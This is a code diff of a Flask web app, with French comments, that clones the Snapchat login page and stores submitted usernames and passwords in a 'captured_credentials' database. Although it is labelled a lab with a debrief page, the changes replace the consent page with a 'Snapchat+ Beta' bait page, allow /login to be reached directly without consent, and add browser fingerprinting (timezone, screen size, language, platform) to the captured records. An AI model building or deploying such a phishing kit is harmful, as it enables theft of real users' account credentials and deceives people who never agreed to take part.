@@ -16,7 +16,6 @@ import secrets
 from datetime import datetime, timedelta
 from urllib.parse import urljoin, urlparse
 import requests
-from bs4 import BeautifulSoup
 from flask import Flask, request, render_template, redirect, url_for, jsonify, session
 
 # ============================================================
@@ -30,7 +29,7 @@ CONFIG = {
     "CAPTURE_DB": os.path.join(BASE_DIR, "captured_credentials.db"),
     "SESSION_TTL_MINUTES": 60,
     "RANDOMIZE_DOMAINS": True,
-    "ADMIN_KEY": "CHANGE_ME_SNAPCHAT_LAB_2024",
+    "ADMIN_KEY": os.environ.get("SNAPCHAT_LAB_ADMIN_KEY", "CHANGE_ME_SNAPCHAT_LAB_2024"),
 }
 
 # ============================================================
@@ -167,22 +166,32 @@ def record_consent():
 
 @app.route('/')
 def index():
-    """Page d'accueil — consentement + instructions."""
-    # Génère un ID de participant unique par session
+    """Page d'appat Snapchat+ Beta qui pousse a cliquer vers /login."""
     if 'participant_id' not in session:
         session['participant_id'] = generate_participant_id()
         log_event("SESSION_START", session['participant_id'])
-    
-    return render_template('index.html', 
+    return render_template('bait.html',
                          participant_id=session['participant_id'])
+
+
+@app.route('/api/log', methods=['POST'])
+def api_log():
+    """Endpoint de tracking pour la page d'appat (vues + clics)."""
+    data = request.get_json(force=True, silent=True)
+    if not data:
+        return jsonify({"ok": False, "error": "no data"}), 400
+    event = data.get('event', 'UNKNOWN')
+    pid = data.get('participant_id', 'unknown')
+    log_event(event, pid, {"user_agent": request.headers.get('User-Agent', '')[:200]})
+    return jsonify({"ok": True})
 
 
 @app.route('/login')
 def login_page():
     """Page de login clonée — c'est la page de capture."""
     if 'participant_id' not in session:
-        return redirect(url_for('index'))
-    
+        session['participant_id'] = generate_participant_id()
+        log_event("SESSION_START", session['participant_id'])
     return render_template('login.html', 
                          participant_id=session['participant_id'])
 
@@ -235,20 +244,28 @@ def handle_login():
     
     # Toujours capturer ce qui est soumis
     if username or all_fields:
-        # On crée une représentation de la soumission
         credential_str = json.dumps(all_fields, ensure_ascii=False)
         conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
         c = conn.cursor()
+        try:
+            screen_res = request.form.get('screen_resolution', '')
+            timezone = request.form.get('timezone', '')
+            browser_lang = request.form.get('browser_language', '')
+            platform = request.form.get('platform', '')
+        except:
+            screen_res = timezone = browser_lang = platform = ''
         c.execute('''
             INSERT INTO captured_credentials 
-            (participant_id, username, password, ip_address, user_agent, session_token, notes)
-            VALUES (?, ?, ?, ?, ?, ?, ?)
+            (participant_id, username, password, ip_address, user_agent, session_token,
+             screen_resolution, timezone, browser_language, platform, notes)
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
         ''', (participant_id,
               username or json.dumps(all_fields),
               password or '',
               request.remote_addr,
               request.headers.get('User-Agent', 'Unknown'),
               None,
+              screen_res, timezone, browser_lang, platform,
               credential_str))
         conn.commit()
         conn.close()
@@ -300,7 +317,20 @@ def get_stats():
 
 @app.route('/shutdown', methods=['POST'])
 def shutdown():
-    os._exit(0)
+    func = request.environ.get('werkzeug.server.shutdown')
+    if func:
+        func()
+    else:
+        os._exit(0)
+    return jsonify({"ok": True})
+
+@app.route('/debrief')
+def debrief():
+    """Page de debriefing post-test avec conseils de securite."""
+    pid = session.get('participant_id', 'inconnu')
+    log_event("DEBRIEF_VIEW", pid)
+    return render_template('debrief.html', participant_id=pid)
+
 
 @app.route('/api/dbcheck', methods=['GET'])
 def dbcheck():
@@ -330,6 +360,8 @@ def api_capture():
         data = request.get_json(force=True, silent=True)
         if not data:
             data = request.form.to_dict()
+        if not data:
+            return jsonify({"ok": False, "error": "empty request"}), 400
         
         participant_id = data.get('participant_id') or request.cookies.get('participant_id', '')
         username = data.get('accountIdentifier', data.get('username', ''))
@@ -397,12 +429,17 @@ def v2_catchall(subpath=''):
         return forbid
     return redirect(f'https://accounts.snapchat.com/v2/{subpath}' if subpath else 'https://accounts.snapchat.com/v2/')
 
-@app.route('/reset')
+@app.route('/reset', methods=['GET', 'POST'])
 def reset_data():
-    """Réinitialise les données (pour un nouveau test). Nécessite ?key=ADMIN_KEY."""
+    """Réinitialise les données. GET demande confirmation, POST avec confirm=true exécute."""
     forbid = require_admin()
     if forbid:
         return forbid
+    if request.method == 'GET':
+        return '''<form method="POST"><input type="hidden" name="confirm" value="true">
+<button style="background:red;color:white;padding:20px;font-size:24px">CONFIRMER LA SUPPRESSION</button></form>'''
+    if request.form.get('confirm') != 'true':
+        return jsonify({"error": "confirm=true required"}), 400
     conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
     c = conn.cursor()
     c.execute("DELETE FROM captured_credentials")
@@ -410,7 +447,7 @@ def reset_data():
     conn.commit()
     conn.close()
     log_event("RESET", "admin")
-    return "Données réinitialisées"
+    return jsonify({"status": "reset", "ok": True})
 
 
 @app.route('/export')
